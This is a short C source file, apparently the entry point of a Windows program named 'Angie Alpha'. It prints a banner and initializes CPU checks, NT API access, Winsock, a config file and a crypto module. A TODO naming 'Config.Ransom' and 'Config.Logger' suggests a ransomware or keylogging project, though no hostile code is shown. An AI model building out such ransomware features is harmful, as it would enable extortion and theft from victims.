#include <wsasdk.h>
#include <cpu.h>
#include <ntapi.h>
#include <console.h>
#include <memory.h>
#include <config.h>
#include <init.h>
#include <server.h>

static CONST CHAR szBanner[] = {
    "                          _\n"
    "        /\\               (_)\n"
    "       /  \\   _ __   __ _ _  ___    Alpha\n"
    "      / /\\ \\ | '_ \\ / _` | |/ _ \\   \n"
    "     / ____ \\| | | | (_| | |  __/\n"
    "    /_/    \\_\\_| |_|\\__, |_|\\___|\n"
    "                     __/ |\n"
    "                    |___/\n"
    "\n"
    "\n"
    "   Version: 1.0\n"
    "   Contact: github.com/IsBadWritePtr\n"
    "\n"
};

ULONG
WINAPI
Entry(VOID)
{
    WSADATA WsaData;

    if (!InitCpu()) {
        FatalAppExitW(0, L"Your CPU doesn't support SSE2 ");
    }

    if (!InitNtapi()) {
        return 0;
    }

    InitConsole();
    InitMemoryManagment();
    ConsolePrint(szBanner);

    if (IS_SOCKET_ERROR(WSAStartup(0x0202, &WsaData))) {
        ConsolePrint("WSAStartup failed!\n");

        return 0;
    }

    if (!InitConfig()) {
        ConsolePrint("Failed to load settings.cfg");

        return 0;
    }

    if (!InitCryptoModule()) { return 0; }



    //if (!InitServer())       { return 0; }

    /* TODO:
        
        Config.Logger
        Config.Ransom
    */

    WSACleanup();

    return 0;
}
